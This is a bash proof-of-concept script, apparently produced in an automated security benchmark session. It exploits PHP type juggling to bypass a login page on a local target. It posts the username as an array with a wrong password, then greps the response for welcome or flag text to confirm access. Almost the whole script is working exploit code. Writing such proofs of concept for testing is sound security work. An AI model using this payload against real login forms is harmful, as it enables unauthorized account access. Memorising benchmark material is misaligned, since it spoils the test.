#!/bin/bash
# POC: Type Juggling Authentication Bypass - Demonstrates authentication bypass by sending username as array parameter with incorrect password
# Target: ./repo
# Created: 2025-11-07T21:38:23.260Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# Type Juggling Authentication Bypass POC
# This script demonstrates how sending username as an array causes authentication bypass
# due to PHP's loose type comparison

# Determine target URL - try common defaults
TARGET_URL="${TARGET_URL:-http://localhost:8080}"

# If localhost fails, try common ports
if ! curl -s -m 2 "${TARGET_URL}/index.php" > /dev/null 2>&1; then
    TARGET_URL="http://localhost:80"
fi

if ! curl -s -m 2 "${TARGET_URL}/index.php" > /dev/null 2>&1; then
    TARGET_URL="http://127.0.0.1:8080"
fi

ENDPOINT="/index.php"
FULL_URL="${TARGET_URL}${ENDPOINT}"

echo "=========================================="
echo "Type Juggling Authentication Bypass POC"
echo "=========================================="
echo "Target: $FULL_URL"
echo ""

# First, verify the target is accessible
echo "[*] Checking target accessibility..."
if ! curl -s -m 5 "$FULL_URL" > /dev/null 2>&1; then
    echo "ERROR: Target $FULL_URL is not accessible"
    echo "Please set TARGET_URL environment variable or ensure the application is running"
    echo "Example: TARGET_URL=http://localhost:8000 ./$(basename $0)"
    exit 1
fi
echo "✓ Target is accessible"
echo ""

# Test 1: Type juggling bypass - username as array with wrong password
echo "[*] Test 1: TYPE JUGGLING BYPASS - username as array with wrong password"
echo "Sending: username[]=admin&password=wrongpassword&login=Login"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -d "username[]=admin&password=wrongpassword&login=Login" \
  -w "\nHTTP_%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | grep -oP "HTTP_\K[0-9]+")
BODY=$(echo "$RESPONSE" | sed '/^HTTP_[0-9]*$/d')

echo "HTTP Response Code: $HTTP_CODE"
echo ""
echo "Response Body (first 500 chars):"
echo "$BODY" | head -c 500
echo ""
echo ""

if echo "$BODY" | grep -qi "Welcome\|flag\|Congratulations\|success"; then
    echo "Result: ✗ VULNERABLE - Authentication BYPASSED!"
    echo "Successfully authenticated despite wrong password with array parameter!"
    exit 0
else
    echo "Result: Type juggling bypass didn't grant access"
    exit 1
fi